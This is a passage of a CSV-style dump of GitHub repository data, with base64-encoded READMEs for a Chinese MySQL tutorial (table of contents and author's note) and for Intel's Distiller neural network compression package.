LjMubWQpCiAgICAtIFvlkb3ku6TooYzlkK/liqjlhbPpl63ph43lkK9NeVNR
TOacjeWKoV0oY2hhcHRlcjIvMi4zLm1kI+WRveS7pOihjOWQr+WKqOWFs+mX
remHjeWQr215c3Fs5pyN5YqhKQogICAgLSBb5Zu+5YOP55WM6Z2i5ZCv5Yqo
5YWz6Zet6YeN5ZCvTXlTUUzmnI3liqFdKGNoYXB0ZXIyLzIuMy5tZCPlm77l
g4/nlYzpnaLlkK/liqjlhbPpl63ph43lkK9teXNxbOacjeWKoSkKICAgIC0g
W+afpeeci+WIneWni+WvhueggV0oY2hhcHRlcjIvMi4zLm1kI+afpeeci+WI
neWni+WvhueggSkKICAgIC0gW+iuvue9ruWIneWni+WMluWvhueggV0oY2hh
cHRlcjIvMi4zLm1kI+iuvue9ruWIneWni+WMluWvhueggSkKICAgIC0gW+WQ
r+WKqOaKpemUmeWkhOeQhl0oY2hhcHRlcjIvMi4zLm1kI+WQr+WKqOaKpemU
meWkhOeQhikKLSAyLjQgW015U1FM5bel5YW3XShjaGFwdGVyMi8yLjQubWQp
CiAgICAtIFvlkb3ku6TooYzkvb/nlKjnqIvluo9dKGNoYXB0ZXIyLzIuNC5t
ZCPlkb3ku6TooYzkvb/nlKjnqIvluo8pCiAgICAtIFtNeVNRTCBXb3JrYmVu
Y2jlrqLmiLfnq69dKGNoYXB0ZXIyLzIuNC5tZCNteXNxbC13b3JrYmVuY2jl
rqLmiLfnq68pCiAgICAtIFvluLjnlKjlm77lvaLnrqHnkIblt6XlhbddKGNo
YXB0ZXIyLzIuNC5tZCPluLjnlKjlm77lvaLnrqHnkIblt6XlhbcpCiAgICAt
IFtNeUNsaeabv+S7o015U1FM55qEbXlzcWzlkb3ku6TooYzlt6XlhbddKGNo
YXB0ZXIyLzIuNC5tZCNteWNsaeabv+S7o215c3Fs55qEbXlzcWzlkb3ku6To
oYzlt6XlhbcpCi0gMi41IFtNeVNRTOmFjee9ruS/ruaUuV0oY2hhcHRlcjIv
Mi41Lm1kKQogICAgLSBbTXlTUUzlronoo4Xnm67lvZXor7TmmI5dKGNoYXB0
ZXIyLzIuNS5tZCNteXNxbOWuieijheebruW9leivtOaYjikKICAgIC0gW+mF
jee9ruaWh+S7tueahOS9jee9rl0oY2hhcHRlcjIvMi41Lm1kI+mFjee9ruaW
h+S7tueahOS9jee9rikKICAgIC0gW1dpbmRvd3Pns7vnu5/phY3nva7mlofk
u7bor7vlj5ZdKGNoYXB0ZXIyLzIuNS5tZCN3aW5kb3dz57O757uf6YWN572u
5paH5Lu26K+75Y+WKQogICAgLSBbTGludXjns7vnu5/phY3nva7mlofku7bo
r7vlj5ZdKGNoYXB0ZXIyLzIuNS5tZCNsaW51eOezu+e7n+mFjee9ruaWh+S7
tuivu+WPlikKICAgIC0gW+mFjee9ruaWh+S7tuWGheWuuV0oY2hhcHRlcjIv
Mi41Lm1kI+mFjee9ruaWh+S7tuWGheWuuSkKCiMjIyMg56ysM+eroCDmlbDm
ja7lupPnmoTln7rmnKzmk43kvZwKCi0gMy4xIFvov57mjqXmlbDmja7lupNd
KGNoYXB0ZXIzLzMuMS5tZCkKICAgIC0gW015U1FM5ZG95Luk6K+t5rOVXShj
aGFwdGVyMy8zLjEubWQjbXlzcWzlkb3ku6Tor63ms5UpCiAgICAtIFtNeVNR
TOWRveS7pOi/nuaOpeaVsOaNruW6k10oY2hhcHRlcjMvMy4xLm1kI215c3Fs
5ZG95Luk6L+e5o6l5pWw5o2u5bqTKQogICAgLSBb5byA5ZCvTXlTUUznmoTo
v5znqIvluJDlj7ddKGNoYXB0ZXIzLzMuMS5tZCPlvIDlkK9teXNxbOeahOi/
nOeoi+W4kOWPtykKICAgIC0gW015U1FM5L+u5pS55a+G56CBXShjaGFwdGVy
My8zLjEubWQjbXlzcWzkv67mlLnlr4bnoIEpCi0gMy4yIFvmn6XnnIvpgInm
i6nmlbDmja7lupNdKGNoYXB0ZXIzLzMuMi5tZCkKICAgIC0gW+afpeeci+aV
sOaNruW6k10oY2hhcHRlcjMvMy4yLm1kI+afpeeci+aVsOaNruW6kykKICAg
IC0gW+mAieaLqeaVsOaNruW6k10oY2hhcHRlcjMvMy4yLm1kI+mAieaLqeaV
sOaNruW6kykKLSAzLjMgW+WIm+W7uuaVsOaNruW6k10oY2hhcHRlcjMvMy4z
Lm1kKQogICAgLSBbU1FM6K+t5Y+l5Yib5bu65pWw5o2u5bqTXShjaGFwdGVy
My8zLjQubWQjc3Fs6K+t5Y+l5Yib5bu65pWw5o2u5bqTKQogICAgLSBb566h
55CG5bel5YW35Yib5bu65pWw5o2u5bqTXShjaGFwdGVyMy8zLjQubWQj566h
55CG5bel5YW35Yib5bu65pWw5o2u5bqTKQotIDMuNCBb5Yig6Zmk5pWw5o2u
5bqTXShjaGFwdGVyMy8zLjQubWQpCiAgICAtIFtTUUzor63lj6XliKDpmaTm
lbDmja7lupNdKGNoYXB0ZXIzLzMuNC5tZCNzcWzor63lj6XliKDpmaTmlbDm
ja7lupMpCiAgICAtIFvnrqHnkIblt6XlhbfliKDpmaTmlbDmja7lupNdKGNo
YXB0ZXIzLzMuNC5tZCPnrqHnkIblt6XlhbfliKDpmaTmlbDmja7lupMpCi0g
My41IFvmlbDmja7lupPlrZjlgqjlvJXmk45dKGNoYXB0ZXIzLzMuNS5tZCMp
CiAgICAtIFvlrZjlgqjlvJXmk47nroDku4tdKGNoYXB0ZXIzLzMuNS5tZCPl
rZjlgqjlvJXmk47nroDku4spCiAgICAtIFvluLjnlKjlvJXmk47lr7nmr5Rd
KGNoYXB0ZXIzLzMuNS5tZCPluLjnlKjlvJXmk47lr7nmr5QpCiAgICAtIFvm
n6XnnIvlrZjlgqjlvJXmk45dKGNoYXB0ZXIzLzMuNS5tZCPmn6XnnIvlrZjl
gqjlvJXmk44pCiAgICAtIFvorr7nva7lrZjlgqjlvJXmk45dKGNoYXB0ZXIz
LzMuNS5tZCPorr7nva7lrZjlgqjlvJXmk44pCiAgICAtIFvlpoLkvZXpgInm
i6nlkIjpgILnmoTlrZjlgqjlvJXmk45dKGNoYXB0ZXIzLzMuNS5tZCPlpoLk
vZXpgInmi6nlkIjpgILnmoTlrZjlgqjlvJXmk44pCgojIyMjIOesrDTnq6Ag
5pWw5o2u6KGo55qE5Z+65pys5pON5L2cCgotIDQuMSDliJvlu7rmlbDmja7o
oagKCiMjIyMg56ysNeeroCDmlbDmja7nsbvlnovlkozov5DnrpfnrKYKCiMj
IyMg56ysNueroCBNeVNRTOWHveaVsAoKIyMjIyDnrKw356ugIOafpeivouaV
sOaNrgoKIyMjIyDnrKw456ugIOaPkuWFpeOAgeabtOaWsOS4juWIoOmZpOaV
sOaNrgoKIyMjIyDnrKw556ugIOe0ouW8lQoKIyMjIyDnrKwxMOeroCDlrZjl
gqjov4fnqIvlkozlh73mlbAKCiMjIyMg56ysMTHnq6Ag6KeG5Zu+CgojIyMj
IOesrDEy56ugIE15U1FM5Ye95pWwCgojIyMjIOesrDEz56ugIE15U1FM55So
5oi3566h55CGCgojIyMjIOesrDE056ugIOaVsOaNruWkh+S7veS4jui/mOWO
nwoKIyMjIyDnrKwxNeeroCBNeVNRTOaXpeW/lwoKIyMjIyDnrKwxNueroCDm
gKfog73kvJjljJYKCiMjIyMg56ysMTfnq6Ag5ZCE56eN6Zeu6aKY6Kej5Yaz
CgotIFvorqlNeVNRTOaUr+aMgWVtb2pp5Zu+5qCH5a2Y5YKoXShjaGFwdGVy
MTcvMTcuMS5tZCkKLSBbQ2VudG9zNuS4i+WNh+e6p015U1FM5pWw5o2u5bqT
XShjaGFwdGVyMTcvMTcuMi5tZCkKLSBbTXlTUUzkv67mlLnlr4bnoIFdKGNo
YXB0ZXIxNy8xNy4zLm1kKQogICAgLSBbbXlzcWxkX3NhZmXkuI3lrZjlnKjk
v67mlLnlr4bnoIFdKGNoYXB0ZXIxNy8xNy4zLm1kI215c3FsZF9zYWZl5LiN
5a2Y5Zyo5L+u5pS55a+G56CBKQogICAgLSBb5ZCv5Yqo5L+u5pS55Lii5aSx
55qEbXlzcWzljZXlrp7kvotyb2905a+G56CB5pa55rOVXShjaGFwdGVyMTcv
MTcuMy5tZCPlkK/liqjkv67mlLnkuKLlpLHnmoRteXNxbOWNleWunuS+i3Jv
b3Tlr4bnoIHmlrnms5UpCiAgICAtIFtNYWPkuIvph43nva5NeVNRTOeahHJv
b3Tlr4bnoIFdKGNoYXB0ZXIxNy8xNy4zLm1kI01hY+S4i+mHjee9rk15U1FM
55qEcm9vdOWvhueggSkKICAgIC0gW+S4jemHjeWQr215c3FsZOS/ruaUueWv
hueggeeahOaWueazlV0oY2hhcHRlcjE3LzE3LjMubWQj5LiN6YeN5ZCvbXlz
cWxk55qE5pa55rOVKQotIFtDZW50b3M3IOm7mOiupOS4uk1hcmlhRELlr7zo
h7RteXNxbOWuieijheS4jeS4il0oY2hhcHRlcjIvMi4yLm1kI2NlbnRvczfl
ronoo4VteXNxbCkKLSBbbXlzcWzlkb3ku6TkuI3lrZjlnKhdKGNoYXB0ZXIy
LzIuMS5tZCNteXNxbOWRveS7pOS4jeWtmOWcqCkKLSBbTXlTUUzmnI3liqHl
kK/liqjlpLHotKXop6PlhrPmlrnmoYhdKGNoYXB0ZXIyLzIuMy5tZCNsaW51
eC3kuIvlkb3ku6Tmk43kvZwpCi0gW+WvhueggeS4jea7oei2s+W9k+WJjeea
hOetlueVpeimgeaxguWvvOiHtOaXoOazleW8gOWQr+i/nOeoi+W4kOWPt10o
Y2hhcHRlcjMvMy4xLm1kI+W8gOWQr215c3Fs55qE6L+c56iL5biQ5Y+3KQoK
CiMjIOivu+iAheWvueixoQoK5pW05pys5Lmm55uu5b2V6KeE5YiS5Y+C6ICD
5LqG5YW25a6D5Yeg5pysIE15U1FMIOS5puexjeebruW9leinhOWIkueahO+8
jOWcqOaIkei+ueWtpuS5oOi+ueaVtOeQhueahOi/h+eoi+WPr+iDveacieS/
ruaUue+8jOi/meS4qui/h+eoi+acieeCueaFou+8jOW4jOacm+iDveWujOaI
kO+8jOaJgOS7peaVmeeoi+mAguWQiOS7peS4i+ivu+iAheWtpuS5oOmYheiv
u+S9v+eUqO+8mgoKLSBNeVNRTCDmlbDmja7lupPliJ3lrabogIXjgIIKLSDl
r7nmlbDmja7lupPlvIDlj5HmhJ/lhbTotqPvvIzluIzmnJvlv6vpgJ/jgIHl
hajpnaLmjozmj6EgTXlTUUwg55qE5Lq65ZGY44CCCi0g5a+55YW25LuW5pWw
5o2u5bqT5pyJ5LiA5a6a55qE5LqG6Kej77yM5oOz6L2s5YiwIE15U1FMIOW5
s+WPsOS9v+eUqOWug+eahOW8gOWPkeiAheOAggotIOWDj+aIkeS4gOagt+ii
q+mAvOaXoOWliOS9v+eUqCBNeVNRTCDmlbDmja7lupPnmoTkurrjgIIKCuS7
juebruW9leadpeeci++8jOeci+S4iuWOu+WGheWuueS4sOWvjO+8jOavlOi+
g+WujOaVtOeahOS7i+e7jeS6hiBNeVNRTCDmlbDmja7lupPmioDmnK/nmoTm
lZnnqIvvvIzmiJHkuI3mmK9gREJBYO+8jOaIkeS4jeaYr++8jOato+WcqOec
i+i/meevh+aWh+eroOeahOS9oO+8jOW+iOWPr+iDveS5n+S4jeaYr++8jOS4
jeaDs+ivr+S6uuWtkOW8n++8jOWcqOmhueebruS4reW6lOeUqOS6huS4gOau
teaXtumXtCBNeVNRTO+8jOWmguaenOS9oOaYr2BEQkFg6K+35aSa5aSa5oyH
5pWZ77yM5paH6YeH5LiN5L2z6L+Y5pyb6auY5oqs6LS15omL77yM5LiN55Sa
5oSf5r+A77yM5bCP5byf5Zyo6L+Z6YeM57uZ5oKo6Z6g6Lqs77yM5qyi6L+O
57uZ5oiR57qg6ZSZ44CCCgrmiJHmg7Plv7XkuIDkuKrlpbPlranlhL/vvIzl
rp7lsZ7ml6DlpYjmiJHlvpfnu6fnu63liqrlipvvvIzlpb3lpb3or7vkuabl
gZrkuKrmnInotqPnmoTkurrvvIzlrozmiJDmiJHnmoTigJzokZfkvZzigJ3v
vIzlvoXmiJHokZfkvZzlrozmiJDlj6/lkKbot5/miJHnuqbkuKrkvJrvvJ8K
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'distiller',130871393,b'Neural Network Distiller by Intel AI Lab: a Python package for neural network compression research.  https://nervanasystems.github.io/distiller',b'Jupyter Notebook',91,2392,,2392,False,b'https://api.github.com/repos/NervanaSystems/distiller/forks',"PGNlbnRlcj4gPGltZyBzcmM9ImltZ3MvYmFubmVyMS5wbmciPjwvY2VudGVy
PgoKWyFbTGljZW5zZV0oaHR0cHM6Ly9pbWcuc2hpZWxkcy5pby9iYWRnZS9M
aWNlbnNlLUFwYWNoZSUyMDIuMC1ibHVlLnN2ZyldKGh0dHBzOi8vZ2l0aHVi
LmNvbS9OZXJ2YW5hU3lzdGVtcy9kaXN0aWxsZXIvYmxvYi9tYXN0ZXIvTElD
RU5TRSkKWyFbRE9JXShodHRwczovL3plbm9kby5vcmcvYmFkZ2UvMTMwODcx
MzkzLnN2ZyldKGh0dHBzOi8vemVub2RvLm9yZy9iYWRnZS9sYXRlc3Rkb2kv
MTMwODcxMzkzKQoKPGRpdiBhbGlnbj0iY2VudGVyIj4KICA8aDM+CiAgICA8
YSBocmVmPSJodHRwczovL2dpdGh1Yi5jb20vTmVydmFuYVN5c3RlbXMvZGlz
dGlsbGVyL3dpa2kiPgogICAgICBXaWtpIGFuZCB0dXRvcmlhbHMKICAgIDwv
YT4KICAgIDxzcGFuPiB8IDwvc3Bhbj4KICAgIDxhIGhyZWY9Imh0dHBzOi8v
bmVydmFuYXN5c3RlbXMuZ2l0aHViLmlvL2Rpc3RpbGxlci9pbmRleC5odG1s
Ij4KICAgICAgRG9jdW1lbnRhdGlvbgogICAgPC9hPgogICAgPHNwYW4+IHwg
PC9zcGFuPgogICAgPGEgaHJlZj0iI2dldHRpbmctc3RhcnRlZCI+CiAgICAg
IEdldHRpbmcgU3RhcnRlZAogICAgPC9hPgogICAgPHNwYW4+IHwgPC9zcGFu
PgogICAgPGEgaHJlZj0iaHR0cHM6Ly9uZXJ2YW5hc3lzdGVtcy5naXRodWIu
aW8vZGlzdGlsbGVyL2FsZ29fcHJ1bmluZy5odG1sIj4KICAgICAgQWxnb3Jp
dGhtcwogICAgPC9hPgogICAgPHNwYW4+IHwgPC9zcGFuPgogICAgPGEgaHJl
Zj0iaHR0cHM6Ly9uZXJ2YW5hc3lzdGVtcy5naXRodWIuaW8vZGlzdGlsbGVy
L2Rlc2lnbi5odG1sIj4KICAgICAgRGVzaWduCiAgICA8L2E+CiAgICA8c3Bh
bj4gfCA8L3NwYW4+CiAgICA8YSBocmVmPSJodHRwczovL2dpdGh1Yi5jb20v
TmVydmFuYVN5c3RlbXMvZGlzdGlsbGVyL3dpa2kvRnJlcXVlbnRseS1Bc2tl
ZC1RdWVzdGlvbnMtKEZBUSkiPgogICAgICBGQVEKICAgIDwvYT4KICA8L2gz
Pgo8L2Rpdj4KCioqRGlzdGlsbGVyKiogaXMgYW4gb3Blbi1zb3VyY2UgUHl0
aG9uIHBhY2thZ2UgZm9yIG5ldXJhbCBuZXR3b3JrIGNvbXByZXNzaW9uIHJl
c2VhcmNoLgoKTmV0d29yayBjb21wcmVzc2lvbiBjYW4gcmVkdWNlIHRoZSBt
ZW1vcnkgZm9vdHByaW50IG9mIGEgbmV1cmFsIG5ldHdvcmssIGluY3JlYXNl
IGl0cyBpbmZlcmVuY2Ugc3BlZWQgYW5kIHNhdmUgZW5lcmd5LiBEaXN0aWxs
ZXIgcHJvdmlkZXMgYSBbUHlUb3JjaF0oaHR0cDovL3B5dG9yY2gub3JnLykg
ZW52aXJvbm1lbnQgZm9yIHByb3RvdHlwaW5nIGFuZCBhbmFseXppbmcgY29t
cHJlc3Npb24gYWxnb3JpdGhtcywgc3VjaCBhcyBzcGFyc2l0eS1pbmR1Y2lu
ZyBtZXRob2RzIGFuZCBsb3ctcHJlY2lzaW9uIGFyaXRobWV0aWMuCgojIyMj
IE5vdGUgb24gUmVsZWFzZSAwLjMgLSBQb3NzaWJsZSBCUkVBS0lORyBDaGFu
Z2VzCgpBcyBvZiByZWxlYXNlIDAuMywgd2UndmUgbW92ZWQgc29tZSBjb2Rl
IGFyb3VuZCB0byBlbmFibGUgcHJvcGVyIHBhY2thZ2luZyBhbmQgaW5zdGFs
bGF0aW9uIG9mIERpc3RpbGxlci4gSW4gYWRkaXRpb24sIHdlIHVwZGF0ZWQg
RGlzdGlsbGVyIHRvIHN1cHBvcnQgUHlUb3JjaCAxLlgsIHdoaWNoIG1pZ2h0
IGFsc28gY2F1c2Ugb2xkZXIgY29kZSB0byBicmVhayBkdWUgdG8gc29tZSBB
UEkgY2hhbmdlcy4gIApJZiB1cGRhdGluZyBmcm9tIGFuIGVhcmxpZXIgcmV2
aXNpb24gb2YgdGhlIGNvZGUsIHBsZWFzZSBtYWtlIHN1cmUgdG8gZm9sbG93
IHRoZSBpbnN0cnVjdGlvbnMgaW4gdGhlIFtpbnN0YWxsXSgjaW5zdGFsbC10
aGUtcGFja2FnZSkgc2VjdGlvbiB0byBtYWtlIHN1cmUgcHJvcGVyIGluc3Rh
bGxhdGlvbiBvZiBEaXN0aWxsZXIgYW5kIGFsbCBkZXBlbmRlbmNpZXMuCgoK
IyMgVGFibGUgb2YgQ29udGVudHMKCi0gW1RhYmxlIG9mIENvbnRlbnRzXSgj
dGFibGUtb2YtY29udGVudHMpCi0gW0hpZ2hsaWdodGVkIGZlYXR1cmVzXSgj
aGlnaGxpZ2h0ZWQtZmVhdHVyZXMpCi0gW0luc3RhbGxhdGlvbl0oI2luc3Rh
bGxhdGlvbikKICAtIFtDbG9uZSBEaXN0aWxsZXJdKCNjbG9uZS1kaXN0aWxs
ZXIpCiAgLSBbQ3JlYXRlIGEgUHl0aG9uIHZpcnR1YWwgZW52aXJvbm1lbnRd
KCNjcmVhdGUtYS1weXRob24tdmlydHVhbC1lbnZpcm9ubWVudCkKICAgIC0g
W1VzaW5nIHZpcnR1YWxlbnZdKCN1c2luZy12aXJ0dWFsZW52KQogICAgLSBb
VXNpbmcgdmVudl0oI3VzaW5nLXZlbnYpCiAgICAtIFtBY3RpdmF0ZSB0aGUg
ZW52aXJvbm1lbnRdKCNhY3RpdmF0ZS10aGUtZW52aXJvbm1lbnQpCiAgLSBb
SW5zdGFsbCB0aGUgcGFja2FnZV0oI2luc3RhbGwtdGhlLXBhY2thZ2UpCi0g
W0dldHRpbmcgU3RhcnRlZF0oI2dldHRpbmctc3RhcnRlZCkKICAtIFtFeGFt
cGxlIGludm9jYXRpb25zIG9mIHRoZSBzYW1wbGUgYXBwbGljYXRpb25dKCNl
eGFtcGxlLWludm9jYXRpb25zLW9mLXRoZS1zYW1wbGUtYXBwbGljYXRpb24p
CiAgICAtIFtUcmFpbmluZy1vbmx5XSgjdHJhaW5pbmctb25seSkKICAgIC0g
W0dldHRpbmcgcGFyYW1ldGVyIHN0YXRpc3RpY3Mgb2YgYSBzcGFyc2lmaWVk
IG1vZGVsXSgjZ2V0dGluZy1wYXJhbWV0ZXItc3RhdGlzdGljcy1vZi1hLXNw
YXJzaWZpZWQtbW9kZWwpCiAgICAtIFtQb3N0LXRyYWluaW5nIHF1YW50aXph
dGlvbl0oI3Bvc3QtdHJhaW5pbmctcXVhbnRpemF0aW9uKQogIC0gW0V4cGxv
cmUgdGhlIHNhbXBsZSBKdXB5dGVyIG5vdGVib29rc10oI2V4cGxvcmUtdGhl
LXNhbXBsZS1qdXB5dGVyLW5vdGVib29rcykKLSBbU2V0IHVwIHRoZSBjbGFz
c2lmaWNhdGlvbiBkYXRhc2V0c10oI3NldC11cC10aGUtY2xhc3NpZmljYXRp
b24tZGF0YXNldHMpCi0gW1J1bm5pbmcgdGhlIHRlc3RzXSgjcnVubmluZy10
aGUtdGVzdHMpCi0gW0dlbmVyYXRpbmcgdGhlIEhUTUwgZG9jdW1lbnRhdGlv
biBzaXRlXSgjZ2VuZXJhdGluZy10aGUtaHRtbC1kb2N1bWVudGF0aW9uLXNp
dGUpCi0gW0J1aWx0IFdpdGhdKCNidWlsdC13aXRoKQotIFtWZXJzaW9uaW5n
XSgjdmVyc2lvbmluZykKLSBbTGljZW5zZV0oI2xpY2Vuc2UpCi0gW0NvbW11
bml0eV0oI2NvbW11bml0eSkKLSBbQWNrbm93bGVkZ21lbnRzXSgjYWNrbm93
bGVkZ21lbnRzKQotIFtEaXNjbGFpbWVyXSgjZGlzY2xhaW1lcikKCiMjIEhp
Z2hsaWdodGVkIGZlYXR1cmVzCiogKipBdXRvbWF0aWMgQ29tcHJlc3Npb24q
KgogIC0gW0F1dG9tYXRlZCBNb2RlbCBDb21wcmVzc2lvbl0oaHR0cHM6Ly9n
aXRodWIuY29tL05lcnZhbmFTeXN0ZW1zL2Rpc3RpbGxlci9ibG9iL21hc3Rl
ci9leGFtcGxlcy9hdXRvX2NvbXByZXNzaW9uL2FtYykgKEFNQykKKiAqKldl
aWdodCBwcnVuaW5nKioKICAtIEVsZW1lbnQtd2lzZSBwcnVuaW5nIHVzaW5n
IG1hZ25pdHVkZSB0aHJlc2hvbGRpbmcsIHNlbnNpdGl2aXR5IHRocmVzaG9s
ZGluZywgdGFyZ2V0IHNwYXJzaXR5IGxldmVsLCBhbmQgYWN0aXZhdGlvbiBz
dGF0aXN0aWNzIAoqICoqU3RydWN0dXJlZCBwcnVuaW5nKioKICAtIENvbnZv
bHV0aW9uOiAyRCAoa2VybmVsLXdpc2UpLCAzRCAoZmlsdGVyLXdpc2UpLCA0
RCAobGF5ZXItd2lzZSksIGFuZCBjaGFubmVsLXdpc2Ugc3RydWN0dXJlZCBw
cnVuaW5nLiAgCiAgLSBGdWxseS1jb25uZWN0ZWQ6IGNvbHVtbi13aXNlIGFu
ZCByb3ctd2lzZSBzdHJ1Y3R1cmVkIHBydW5pbmcuCiAgLSBTdHJ1Y3R1cmUg
Z3JvdXBzIChlLmcuIHN0cnVjdHVyZXMgb2YgNCBmaWx0ZXJzKS4KICAtIFN0
cnVjdHVyZS1yYW5raW5nIHdpdGggdXNpbmcgd2VpZ2h0cyBvciBhY3RpdmF0
aW9ucyBjcml0ZXJpYSAoTHAtbm9ybSwgQVBvWiwgZ3JhZGllbnRzLCByYW5k
b20sIGV0Yy4pLgogIC0gU3VwcG9ydCBmb3IgbmV3IHN0cnVjdHVyZXMgKGUu
Zy4gYmxvY2sgcHJ1bmluZykKKiAqKkNvbnRyb2wqKgogIC0gU29mdCAobWFz
ayBvbiBmb3J3YXJkLXBhc3Mgb25seSkgYW5kIGhhcmQgcHJ1bmluZyAocGVy
bWFuZW50bHkgZGlzY29ubmVjdCBuZXVyb25zKQogIC0gRHVhbCB3ZWlnaHQg
Y29waWVzIChjb21wdXRlIGxvc3Mgb24gbWFza2VkIHdlaWdodHMsIGJ1dCB1
cGRhdGUgdW5tYXNrZWQgd2VpZ2h0cykgIAogIC0gTW9kZWwgdGhpbm5pbmcg
KEFLQSAibmV0d29yayBnYXJiYWdlIHJlbW92YWwiKSB0byBwZXJtYW5lbnRs
eSByZW1vdmUgcHJ1bmVkIG5ldXJvbnMgYW5kIGNvbm5lY3Rpb25zLgoqICoq
U2NoZWR1bGUqKgogIC0gRmxleGlibGUgc2NoZWR1bGluZyBvZiBwcnVuaW5n
LCByZWd1bGFyaXphdGlvbiwgYW5kIGxlYXJuaW5nIHJhdGUgZGVjYXkgKGNv
bXByZXNzaW9uIHNjaGVkdWxpbmcpCiAgLSBPbmUtc2hvdCBhbmQgaXRlcmF0
aXZlIHBydW5pbmcgKGFuZCBmaW5lLXR1bmluZykgYXJlIHN1cHBvcnRlZC4K
ICAtIEVhc2lseSBjb250cm9sIHdoYXQgaXMgcGVyZm9ybWVkIGVhY2ggdHJh
aW5pbmcgc3RlcCAoZS5nLiBncmVlZHkgbGF5ZXIgYnkgbGF5ZXIgcHJ1bmlu
ZyB0byBmdWxsIG1vZGVsIHBydW5pbmcpLiAKICAtIEF1dG9tYXRpYyBncmFk
dWFsIHNjaGVkdWxlIChBR1ApIGZvciBwcnVuaW5nIGluZGl2aWR1YWwgY29u
bmVjdGlvbnMgYW5kIGNvbXBsZXRlIHN0cnVjdHVyZXMuCiAgLSBUaGUgY29t
cHJlc3Npb24gc2NoZWR1bGUgaXMgZXhwcmVzc2VkIGluIGEgWUFNTCBmaWxl
IHNvIHRoYXQgYSBzaW5nbGUgZmlsZSBjYXB0dXJlcyB0aGUgZGV0YWlscyBv
ZiBleHBlcmltZW50cy4gIFRoaXMgW2RlcGVuZGVuY3kgaW5qZWN0aW9uXSho
dHRwczovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9EZXBlbmRlbmN5X2luamVj
dGlvbikgZGVzaWduIGRlY291cGxlcyB0aGUgRGlzdGlsbGVyIHNjaGVkdWxl
ciBhbmQgbGlicmFyeSBmcm9tIGZ1dHVyZSBleHRlbnNpb25zIG9mIGFsZ29y
aXRobXMuCiogRWxlbWVudC13aXNlIGFuZCBmaWx0ZXItd2lzZSBwcnVuaW5n
ICoqc2Vuc2l0aXZpdHkgYW5hbHlzaXMqKiAodXNpbmcgTDEtbm9ybSB0aHJl
c2hvbGRpbmcpLiBFeGFtaW5lIHRoZSBkYXRhIGZyb20gc29tZSBvZiB0aGUg
bmV0d29ya3Mgd2UgYW5hbHl6ZWQsIHVzaW5nIFt0aGlzIG5vdGVib29rXSho
dHRwczovL2dpdGh1Yi5jb20vTmVydmFuYVN5c3RlbXMvZGlzdGlsbGVyL2Js
b2IvbWFzdGVyL2p1cHl0ZXIvc2Vuc2l0aXZpdHlfYW5hbHlzaXMuaXB5bmIp
LgoqICoqUmVndWxhcml6YXRpb24qKgogIC0gTDEtbm9ybSBlbGVtZW50LXdp
c2UgcmVndWxhcml6YXRpb24KICAtIEdyb3VwIExhc3NvIGFuIGdyb3VwIHZh
cmlhbmNlIHJlZ3VsYXJpemF0aW9uICAgCiogKipRdWFudGl6YXRpb24qKgog
IC0gQXV0b21hdGljIG1lY2hhbmlzbSB0byB0cmFuc2Zvcm0gZXhpc3Rpbmcg
bW9kZWxzIHRvIHF1YW50aXplZCB2ZXJzaW9ucywgd2l0aCBjdXN0b21pemFi
bGUgYml0LXdpZHRoIGNvbmZpZ3VyYXRpb24gZm9yIGRpZmZlcmVudCBsYXll
cnMuIE5vIG5lZWQgdG8gcmUtd3JpdGUgdGhlIG1vZGVsIGZvciBkaWZmZXJl
bnQgcXVhbnRpemF0aW9uIG1ldGhvZHMuCiAgLSBbUG9zdC10cmFpbmluZyBx
dWFudGl6YXRpb25dKGh0dHBzOi8vbmVydmFuYXN5c3RlbXMuZ2l0aHViLmlv
L2Rpc3RpbGxlci91c2FnZS9pbmRleC5odG1sIyNwb3N0LXRyYWluaW5nLXF1
YW50aXphdGlvbikgb2YgdHJhaW5lZCBmdWxsLXByZWNpc2lvbiBtb2RlbHMs
IGR5bmFtaWMgYW5kIHN0YXRpYyAoc3RhdGlzdGljcy1iYXNlZCkKICAtIFN1
cHBvcnQgZm9yIFtxdWFudGl6YXRpb24tYXdhcmUgdHJhaW5pbmddKGh0dHBz
Oi8vbmVydmFuYXN5c3RlbXMuZ2l0aHViLmlvL2Rpc3RpbGxlci9hbGdvX3F1
YW50aXphdGlvbi5odG1sI3F1YW50aXphdGlvbi1hd2FyZS10cmFpbmluZykg
aW4gdGhlIGxvb3AKKiAqKktub3dsZWRnZSBkaXN0aWxsYXRpb24qKgogIC0g
VHJhaW5pbmcgd2l0aCBba25vd2xlZGdlIGRpc3RpbGxhdGlvbl0oaHR0cHM6
Ly9uZXJ2YW5hc3lzdGVtcy5naXRodWIuaW8vZGlzdGlsbGVyL2tub3dsZWRn
ZV9kaXN0aWxsYXRpb24uaHRtbCksIGluIGNvbmp1bmN0aW9uIHdpdGggdGhl
IG90aGVyIGF2YWlsYWJsZSBwcnVuaW5nIC8gcmVndWxhcml6YXRpb24gLyBx
dWFudGl6YXRpb24gbWV0aG9kcy4KKiAqKkNvbmRpdGlvbmFsIGNvbXB1dGF0
aW9uKioKICAtIFNhbXBsZSBpbXBsZW1lbnRhdGlvbiBvZiBFYXJseSBFeGl0
CiogKipMb3cgcmFuayBkZWNvbXBvc2l0aW9uKioKICAtIFNhbXBsZSBpbXBs
ZW1lbnRhdGlvbiBvZiBbdHJ1bmNhdGVkIFNWRF0oaHR0cHM6Ly9naXRodWIu
Y29tL05lcnZhbmFTeXN0ZW1zL2Rpc3RpbGxlci9ibG9iL21hc3Rlci9qdXB5
dGVyL3RydW5jYXRlZF9zdmQuaXB5bmIpCiogTG90dGVyeSBUaWNrZXQgSHlw
b3RoZXNpcyB0cmFpbmluZyAKKiBFeHBvcnQgc3RhdGlzdGljcyBzdW1tYXJp
ZXMgdXNpbmcgUGFuZGFzIGRhdGFmcmFtZXMsIHdoaWNoIG1ha2VzIGl0IGVh
c3kgdG8gc2xpY2UsIHF1ZXJ5LCBkaXNwbGF5IGFuZCBncmFwaCB0aGUgZGF0
YS4KKiBBIHNldCBvZiBbSnVweXRlciBub3RlYm9va3NdKGh0dHBzOi8vbmVy
dmFuYXN5c3RlbXMuZ2l0aHViLmlvL2Rpc3RpbGxlci9qdXB5dGVyL2luZGV4
